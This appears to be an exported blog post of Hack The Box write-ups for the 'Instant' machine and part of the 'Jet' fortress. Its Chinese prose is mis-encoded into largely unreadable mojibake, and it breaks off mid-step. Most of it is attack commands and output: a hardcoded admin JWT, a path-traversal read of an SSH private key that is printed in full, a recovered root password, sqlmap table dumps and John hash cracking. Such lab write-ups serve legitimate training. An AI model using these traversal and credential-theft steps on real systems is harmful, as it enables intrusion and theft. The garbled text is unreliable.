#\råœ¨ç½‘é¡µä¸­å¯ä»¥ä¸‹è½½APKå®‰è£…åŒ…\nå°†å…¶ä¸‹è½½ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯kalié‡Œé¢çš„apktool\n[root@kali] /home/kali/Instant/ â¯ apktool d instant.apk åœ¨network_security_config.xmlå‘ç°å­åŸŸå\n[root@kali] /home/kali/Instant/instant/res/xml â¯ cat network_security_config.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;network-security-config\u0026gt;\r\u0026lt;domain-config cleartextTrafficPermitted=\u0026#34;true\u0026#34;\u0026gt;\r\u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;mywalletv1.instant.htb\u0026lt;/domain\u0026gt;\r\u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;swagger-ui.instant.htb\u0026lt;/domain\u0026gt;\r\u0026lt;/domain-config\u0026gt;\r\u0026lt;/network-security-config\u0026gt;# æ·»åŠ åˆ°/etc/hosts\nDirsearch #\r[root@kali] /home/kali/Instant â¯ dirsearch -u \u0026#34;swagger-ui.instant.htb\u0026#34; -t 50 â\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Instant/reports/_swagger-ui.instant.htb/_24-12-20_15-21-03.txt\rTarget: http://swagger-ui.instant.htb/\r[15:21:03] Starting: [15:21:18] 308 - 263B - /apidocs -\u0026gt; http://swagger-ui.instant.htb/apidocs/\r[15:21:36] 403 - 287B - /server-status [15:21:36] 403 - 287B - /server-status/ Task Completed JWT token #\rè¿›å…¥apidocsç›®å½•æŸ¥çœ‹\nå¯ä»¥å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·è¯•ä¸€ä¸‹\ncurl -X POST \u0026#34;http://swagger-ui.instant.htb/api/v1/register\u0026#34; -H \u0026#34;accept: application/json\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#34;{ \\\u0026#34;email\\\u0026#34;: \\\u0026#34;string\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;hyh\\\u0026#34;, \\\u0026#34;pin\\\u0026#34;: \\\u0026#34;12121\\\u0026#34;, \\\u0026#34;username\\\u0026#34;: \\\u0026#34;hyh\\\u0026#34;}\u0026#34; {\r\u0026#34;Access-Token\u0026#34;: \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjQ5ZmU0MjlkLTcwYzMtNGU2MC1iMDcxLTc3MDZkNjQ2MmI0NSIsImV4cCI6MTczNDcxMDYwMX0.TXTuplRyzyru23WdofFve33S7FiLgfs34_P4gXgbOcU\u0026#34;,\r\u0026#34;Status\u0026#34;: 201\r}\r#Jwt decode\r{\r\u0026#34;id\u0026#34;: 4,\r\u0026#34;role\u0026#34;: \u0026#34;instantian\u0026#34;,\r\u0026#34;walId\u0026#34;: \u0026#34;49fe429d-70c3-4e60-b071-7706d6462b45\u0026#34;,\r\u0026#34;exp\u0026#34;: 1734710601\r} å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œè€Œå…¶ä»–çš„åŠŸèƒ½éœ€è¦Adminçš„tokenæ‰èƒ½ä½¿ç”¨ï¼Œå½“å‰æ€è·¯å°±æ˜¯å»apkçš„æºæ–‡ä»¶é‡Œæ‰¾ç±»ä¼¼äºtokenæˆ–keyçš„å€¼\nä¼¼ä¹åœ¨è¿™ä¸ªåœ°æ–¹å­˜åœ¨ä¸€ä¸ªæµ‹è¯•å‡½æ•°ğŸ‘‡\nè¯»å–é‚£ä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå­˜åœ¨çš„tokenï¼Œå¹¶ä¸”ç”¨æˆ·æ˜¯admin\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA\r#jwt decode\r{\r\u0026#34;id\u0026#34;: 1,\r\u0026#34;role\u0026#34;: \u0026#34;Admin\u0026#34;,\r\u0026#34;walId\u0026#34;: \u0026#34;f0eca6e5-783a-471d-9d8f-0162cbc900db\u0026#34;,\r\u0026#34;exp\u0026#34;: 33259303656\r} ä¿å­˜tokenåˆ°ç½‘é¡µä¸­\nä½¿ç”¨/api/v1/admin/read/logçš„åŠŸèƒ½ï¼Œå°è¯•è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å–åˆ°äº†/etc/passwd\næˆ‘åœ¨ç½‘é¡µæ ‡é¢˜ä¸‹é¢çš„é‚£ä¸ªJsonæ–‡ä»¶ä¸­å‘ç°äº†æ³„éœ²çš„ç”¨æˆ·åï¼šshirohige\nå› æ­¤å°è¯•è¯»å–ä»–çš„sshç§é’¥å†…å®¹\n../../../../../../../home/shirohige/.ssh/id_rsa\r{\r\u0026#34;/home/shirohige/logs/../../../../../../../home/shirohige/.ssh/id_rsa\u0026#34;: [\r\u0026#34;-----BEGIN OPENSSH PRIVATE KEY-----\\n\u0026#34;,\r\u0026#34;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\\n\u0026#34;,\r\u0026#34;NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\\n\u0026#34;,\r\u0026#34;nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\\n\u0026#34;,\r\u0026#34;dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/\\n\u0026#34;,\r\u0026#34;5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY\\n\u0026#34;,\r\u0026#34;8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF\\n\u0026#34;,\r\u0026#34;uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS\\n\u0026#34;,\r\u0026#34;jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF\\n\u0026#34;,\r\u0026#34;Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2\\n\u0026#34;,\r\u0026#34;EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8\\n\u0026#34;,\r\u0026#34;sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4\\n\u0026#34;,\r\u0026#34;/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY\\n\u0026#34;,\r\u0026#34;kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE\\n\u0026#34;,\r\u0026#34;xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg\\n\u0026#34;,\r\u0026#34;J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa\\n\u0026#34;,\r\u0026#34;m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l\\n\u0026#34;,\r\u0026#34;2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN\\n\u0026#34;,\r\u0026#34;SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP\\n\u0026#34;,\r\u0026#34;OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy\\n\u0026#34;,\r\u0026#34;nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb\\n\u0026#34;,\r\u0026#34;T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y\\n\u0026#34;,\r\u0026#34;1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0\\n\u0026#34;,\r\u0026#34;cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA\\n\u0026#34;,\r\u0026#34;wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA\\n\u0026#34;,\r\u0026#34;wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18\\n\u0026#34;,\r\u0026#34;nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK\\n\u0026#34;,\r\u0026#34;gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt\\n\u0026#34;,\r\u0026#34;pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh\\n\u0026#34;,\r\u0026#34;HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX\\n\u0026#34;,\r\u0026#34;zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5\\n\u0026#34;,\r\u0026#34;SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY\\n\u0026#34;,\r\u0026#34;CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ\\n\u0026#34;,\r\u0026#34;n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G\\n\u0026#34;,\r\u0026#34;HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP\\n\u0026#34;,\r\u0026#34;5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\\n\u0026#34;,\r\u0026#34;bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\\n\u0026#34;,\r\u0026#34;-----END OPENSSH PRIVATE KEY-----\\n\u0026#34;\r],\r\u0026#34;Status\u0026#34;: 201\r} æ ¼å¼åŒ–ä¸€ä¸‹ä¹‹åï¼ŒæŠŠå¯†é’¥çš„æƒé™è®¾ç½®ä¸º600ï¼Œç„¶åä½¿ç”¨sshç™»å½•å³å¯è·å–åˆ°User\nPrivilege Escalation #\rå‘ç°ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶\nå› ä¸ºæ²¡æœ‰ncï¼Œé‚£ä¹ˆä½¿ç”¨scpè¿›è¡Œè¿œç¨‹ä¸‹è½½æ–‡ä»¶\n[root@kali] /home/kali/Instant â¯ scp -i shirohige_key shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./ å¾—åˆ°adminçš„å¯†ç hash\npbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978 ä¸è¿‡ç”±äºè¿™ä¸ªç®—æ³•æ¯”è¾ƒè€—æ—¶é—´ï¼Œç›´æ¥çˆ†ç ´åº”è¯¥å‡ºä¸æ¥\næˆ‘åœ¨/opté‡Œé¢å‘ç°äº†ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶\nä»¥åŠä¸€ä¸ªGithubçš„è§£å¯†è„šæœ¬\n[github author=\u0026ldquo;Dimont-Gattsu\u0026rdquo; project=\u0026ldquo;SolarPuttyDecrypterPy\u0026rdquo;][/github]\n[root@kali] /home/kali/Instant/SolarPuttyDecrypterPy (main) âš¡ â¯ python decrypt2.py sessions-backup.dat /usr/share/wordlists/rockyou.txt å¾—åˆ°å¯†ç \nusernameï¼šroot\rpasswordï¼š12**24nzC!r0c%q12 åˆ‡æ¢ç”¨æˆ·å³å¯æ‹¿åˆ°root\nSummary #\rUserï¼šé¦–å…ˆè¿›è¡ŒAPKåˆ†æï¼Œåœ¨ç½‘ç»œé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°å­åŸŸåä¿¡æ¯ï¼Œè®¤è¯æœºåˆ¶æ˜¯ä½¿ç”¨çš„JWT tokenï¼Œä¸ºäº†æ‰¾åˆ°JWTçš„ç”Ÿæˆå¯†é’¥æˆ–è€…æ˜¯ç¤ºä¾‹tokenï¼Œåœ¨APKçš„åŒ…é‡Œé¢å…¨å±€æœç´¢å¾—åˆ°äº†adminçš„tokenã€‚åœ¨è¯»å–æ—¥å¿—çš„è·¯ç”±ä¸Šå­˜åœ¨ç›®å½•ç©¿è¶Šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç›´æ¥è¯»å–åˆ°äº†æ³„éœ²ç”¨æˆ·çš„SSHç§é’¥è¿›è¡Œç™»å½•ã€‚\nRootï¼šæ„Ÿåˆ°ä¸åŒå¯»å¸¸çš„æ˜¯å±…ç„¶ä¸æ˜¯hashcatçˆ†ç ´å¯†ç ï¼Œæˆ–è®¸æ˜¯å› ä¸ºPBKDF2-SHA256çš„çˆ†ç ´éš¾åº¦å¤ªé«˜äº†ï¼Œå› ä¸ºæˆ‘æ˜¯ä»æ ¹ç›®å½•å¼€å§‹æŸ¥æ‰¾çš„ï¼Œæœ€å¼€å§‹çš„æ—¶å€™å°±å…³æ³¨åˆ°äº†è¿™ä¸ªsession-backup.datï¼Œä½†æ˜¯åœ¨instant.dbæ–‡ä»¶ä¸­åˆå­˜åœ¨å¯†ç hashçš„æ³„éœ²ï¼Œå¯¼è‡´æˆ‘åˆ°å¤„å»å¯»æ‰¾çˆ†ç ´æ–¹å¼ã€‚æœ€åè¿˜æ˜¯å›åˆ°äº†Solar-Puttyçš„å¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•ä½¿ç”¨è„šæœ¬è§£å¯†å¾—åˆ°äº†å¯†ç ã€‚\n","date":"2024-12-20","externalUrl":null,"permalink":"/posts/2024/12/htb-instant/","section":"Posts","summary":"","title":"HTB-Instant","type":"posts"},{"content":"","date":"2024-12-19","externalUrl":null,"permalink":"/tags/fortresses/","section":"Tags","summary":"","title":"Fortresses","type":"tags"},{"content":"\rAbout #\rè¾¾åˆ°HTBçš„Hackerç­‰çº§åå¯ä»¥è¿›å…¥Advanced Labsï¼Œæœ¬æ–‡æ˜¯å…³äºFortressesï¼ˆå ¡å’ï¼‰ä¸­çš„JetæŒ‘æˆ˜\nConnect #\rNmapæ‰«æç»“æœå¦‚ä¸‹\n[root@kali] /home/kali/Jet\râ¯ nmap 10.13.37.10 -T4 -Pn -sS Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 15:06 CST\rNmap scan report for jet.com (10.13.37.10)\rHost is up (0.38s latency).\rNot shown: 994 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r53/tcp open domain\r80/tcp open http\r2222/tcp open EtherNetIP-1\r5555/tcp open freeciv\r7777/tcp open cbt ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€80ç«¯å£å³å¯è·å¾—flag\nJET{s4n1ty_ch3ck} Digging in\u0026hellip; #\rDig Command #\rdigï¼ˆDomain Information Groperï¼‰å‘½ä»¤æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ DNS æŸ¥è¯¢å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•è€…æ”¶é›†ç›®æ ‡åŸŸåçš„ DNS ä¿¡æ¯ï¼Œä»è€Œæ›´å¥½åœ°äº†è§£ç›®æ ‡çš„ç½‘ç»œç»“æ„å’Œæ½œåœ¨æ”»å‡»é¢ã€‚\nä»¥ä¸‹æ˜¯ dig çš„ä¸€äº›å¸¸è§ç”¨é€”ï¼š\n1. è§£æåŸŸå\nè·å–ç›®æ ‡åŸŸåå¯¹åº”çš„ IP åœ°å€ï¼ˆA è®°å½•ï¼‰ã€‚ bashå¤åˆ¶ä»£ç dig example.com\nç”¨é€”ï¼šç¡®å®šç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œä¸ºåç»­æ‰«ææˆ–æ”»å‡»åšå‡†å¤‡ã€‚\n2. æŸ¥è¯¢ç‰¹å®šçš„ DNS è®°å½•\næŸ¥è¯¢ MXï¼ˆé‚®ä»¶äº¤æ¢ï¼‰ã€NSï¼ˆåŸŸåæœåŠ¡å™¨ï¼‰ã€CNAMEï¼ˆåˆ«åè®°å½•ï¼‰ç­‰ä¿¡æ¯ã€‚ bashå¤åˆ¶ä»£ç dig example.com MX # æŸ¥è¯¢é‚®ä»¶æœåŠ¡å™¨ dig example.com NS # æŸ¥è¯¢æƒå¨åŸŸåæœåŠ¡å™¨ dig example.com CNAME # æŸ¥è¯¢åˆ«åè®°å½•\nç”¨é€”ï¼šè¯†åˆ«ç›®æ ‡ç½‘ç»œä¸­çš„å…³é”®æœåŠ¡æˆ–åŸºç¡€è®¾æ–½ã€‚\n3. åå‘ DNS æŸ¥è¯¢\nä½¿ç”¨ç›®æ ‡ IP æŸ¥è¯¢å…¶åŸŸåã€‚ bashå¤åˆ¶ä»£ç dig -x 192.0.2.1\nç”¨é€”ï¼šå¸®åŠ©ç¡®å®šæœåŠ¡å™¨çš„ä¸»æœºåï¼Œå¯èƒ½æš´éœ²å‡ºå†…éƒ¨ç½‘ç»œä¿¡æ¯æˆ–ä¸å…¶ä»–æœåŠ¡çš„å…³è”ã€‚\nDig Jet #\rdig @10.13.37.10 -x 10.13.37.10 @ç¬¦å·ç”¨æ¥æŒ‡å®šdnsä¸»æœºï¼Œ-xæ˜¯åå‘æŸ¥è¯¢åŸŸå\n[root@kali] /home/kali/Jet â¯ dig @10.13.37.10 -x 10.13.37.10 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.20.2-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.13.37.10 -x 10.13.37.10\r; (1 server found)\r;; global options: +cmd\r;; Got answer:\r;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 57681\r;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\r;; WARNING: recursion requested but not available\r;; OPT PSEUDOSECTION:\r; EDNS: version: 0, flags:; udp: 1232\r; COOKIE: bfa9dd40818456c5010000006762761c5f63110cd3784e8d (good)\r;; QUESTION SECTION:\r;10.37.13.10.in-addr.arpa. IN PTR\r;; ANSWER SECTION:\r10.37.13.10.in-addr.arpa. 604800 IN PTR www.securewebinc.jet.\r;; Query time: 388 msec\r;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)\r;; WHEN: Wed Dec 18 15:13:16 CST 2024\r;; MSG SIZE rcvd: 115 å‘ç°å­˜åœ¨ä¸€ä¸ªwww.securewebinc.jetçš„åŸŸåï¼Œå°†å…¶æ·»åŠ åˆ°/etc/hosts\nè¿›å…¥åˆ°ç½‘ç«™åº•éƒ¨ï¼Œæ‰¾åˆ°flag\nJET{w3lc0me_4nd_h@v3_fun!} Going Deeper #\rdirsearch #\rä½¿ç”¨direarchè¿›è¡Œç›®å½•æ‰«æï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ª/jsç›®å½•ï¼Œåœ¨ç›®å½•é‡Œé¢æ‰¾åˆ°äº†ä¸€ä¸ªsecure.js\n[root@kali] /home/kali/Desktop â¯ dirsearch -u http://www.securewebinc.jet/js/ -t 50\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Desktop/reports/http_www.securewebinc.jet/_js__24-12-18_15-20-45.txt\rTarget: http://www.securewebinc.jet/\r[15:20:45] Starting: js/ [15:21:38] 200 - 1KB - /js/secure.js Task Completed è®¿é—®http://www.securewebinc.jet/js/secure.jsï¼Œå¾—åˆ°çš„å†…å®¹æ˜¯è¿™æ ·çš„ğŸ‘‡\neval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59)); ChatGPTå°è¯•è§£å¯†åå¾—åˆ°çš„åŸæ–‡ğŸ‘‡ï¼Œæš´éœ²å‡ºæ¥ä¸€ä¸ªæ–°çš„è·¯å¾„ï¼Œå¹¶ä¸”è¿˜æœ‰stats.php\nfunction getStats() {\r$.ajax({\rurl: \u0026#34;/dirb_safe_dir_rf9EmcEIx/admin/stats.php\u0026#34;,\rsuccess: function(result) {\r$(\u0026#39;#attacks\u0026#39;).html(result);\r},\rerror: function(result) {\rconsole.log(result);\r}\r});\r}\rgetStats();\rsetInterval(function() {\rgetStats();\r}, 10000); é’ˆå¯¹è¿™ä¸ª/dirb_safe_dir_rf9EmcEIx/admin/ç›®å½•å†æ¬¡è¿›è¡Œæ‰«æ\n[root@kali] /home/kali/Jet\râ¯ dirsearch -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/ -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Desktop/reports/http_www.securewebinc.jet/_dirb_safe_dir_rf9EmcEIx_admin__24-12-18_15-27-56.txt\rTarget: http://www.securewebinc.jet/\r[15:27:56] Starting: dirb_safe_dir_rf9EmcEIx/admin/ [15:28:25] 200 - 0B - /dirb_safe_dir_rf9EmcEIx/admin/db.php [15:28:35] 200 - 3KB - /dirb_safe_dir_rf9EmcEIx/admin/login.php [15:28:51] 200 - 10B - /dirb_safe_dir_rf9EmcEIx/admin/stats.php Task Completed è¿›å…¥login.phpï¼ŒView-Sourceå¾—åˆ°flag\nJET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll} Bypassing Authentication #\rSQL Injection #\rè¿›å…¥ç™»å½•é¡µé¢ï¼Œä¼¼ä¹ç”¨æˆ·åå¤„å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œè€Œä¸”æ˜¯å•å¼•å·é—­åˆçš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nä½†æ˜¯æ— æ³•ç›´æ¥ç»•è¿‡ç™»å½•ï¼Œå‰ç«¯é¡µé¢åªæœ‰ä¸¤ç§å›æ˜¾ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¸ƒå°”ï¼ˆBoolï¼‰ç›²æ³¨\nå°†POSTæŠ¥æ–‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨SQLmapè¿›è¡Œæ³¨å…¥\n[root@kali] /home/kali/Jet â¯ sqlmap -r login.txt --dbs å­˜åœ¨jetadminè¿™ä¸ªæ•°æ®åº“\n[root@kali] /home/kali/Jet â¯ sqlmap -r login.txt -D jetadmin -T users -dump åœ¨userè¡¨é‡Œå­˜åœ¨adminçš„ç”¨æˆ·ä¿¡æ¯\n97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 ä½¿ç”¨John The Ripperè¿›è¡Œå¯†ç çˆ†ç ´\n[root@kali] /home/kali/Jet â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 Using default input encoding: UTF-8\rLoaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])\rWarning: poor OpenMP scalability for this hash type, consider --fork=4\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rHackthesystem200 (?) 1g 0:00:00:00 DONE (2024-12-18 16:03) 1.818g/s 20256Kp/s 20256Kc/s 20256KC/s Hannah.rules..Galgenwaard\rUse the \u0026#34;--show --format=Raw-SHA256\u0026#34; options to display all of the cracked passwords reliably\rSession completed. å¾—åˆ°å¯†ç æ˜¯ï¼šHackthesystem200\nç™»å½•è¿›å»ï¼Œå¾—åˆ°flag\nJET{sQl_1nj3ct1ons_4r3_fun!} Command #\rPreg_match RCE #\rè¿™ä¸ªDashboardé‡Œå”¯ä¸€èƒ½ä½¿ç”¨çš„åŠŸèƒ½å°±æ˜¯emailå‘é€é‚®ä»¶\nå¹¶ä¸”å¯ä»¥é¢„è§ˆè‡ªå·±çš„é‚®ä»¶å†…å®¹ï¼Œè¿™é‡Œè¿›è¡ŒæŠ“åŒ…æŸ¥çœ‹POSTçš„Bodyï¼Œä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹æˆ‘å°†PostDataè¿›è¡Œäº†urldecode\nPOST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1\rHost: www.securewebinc.jet\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 299\rOrigin: http://www.securewebinc.jet\rConnection: keep-alive\rReferer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php\rCookie: PHPSESSID=id2a0g01fkqtieui776n5seib3\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rswearwords[/fuck/i]=make love\u0026amp;swearwords[/shit/i]=poop\u0026amp;swearwords[/ass/i]=behind\u0026amp;swearwords[/dick/i]=penis\u0026amp;swearwords[/whore/i]=escort\u0026amp;swearwords[/asshole/i]=bad person\u0026amp;to=123@qq.com\u0026amp;subject=123\u0026amp;message=\u0026lt;p\u0026gt;123\u0026lt;br\u0026gt;\u0026lt;/p\u0026gt;\u0026amp;_wysihtml5_mode=1 ä¼¼ä¹é‡Œé¢æœ‰äº›å‚æ•°ä¼šè¢«æ›¿æ¢ï¼Ÿå°è¯•è¿™æ 